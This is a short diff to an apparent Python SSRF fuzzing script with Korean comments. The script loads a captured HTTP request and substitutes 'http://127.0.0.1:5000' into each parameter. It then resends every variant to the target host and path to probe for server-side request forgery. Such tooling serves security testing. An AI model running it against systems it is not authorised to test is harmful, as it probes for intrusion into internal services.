@@ -78,7 +78,7 @@ class Packet:
 
 # 파일 경로를 입력하여 Packet 인스턴스 생성
 
-file_path = input()
+file_path = input('Enter Packet file path : ')
 packet_instance = Packet(file_path)
 
 # 결과 출력
@@ -96,12 +96,12 @@ ssrf_data = []
 
 for key in packet_instance.data.keys():
     sub = packet_instance.data.copy()
-    sub[key] = '127.0.0.1'
+    sub[key] = 'http://127.0.0.1:5000'
     ssrf_data.append(sub)
 
 print(ssrf_data)
 
 for data in ssrf_data:
-    request(packet_instance.method, packet_instance.headers['Host'], packet_instance.headers, data)
+    request(packet_instance.method, packet_instance.headers['Host'] + '/' + packet_instance.path, packet_instance.headers, data)
 
 
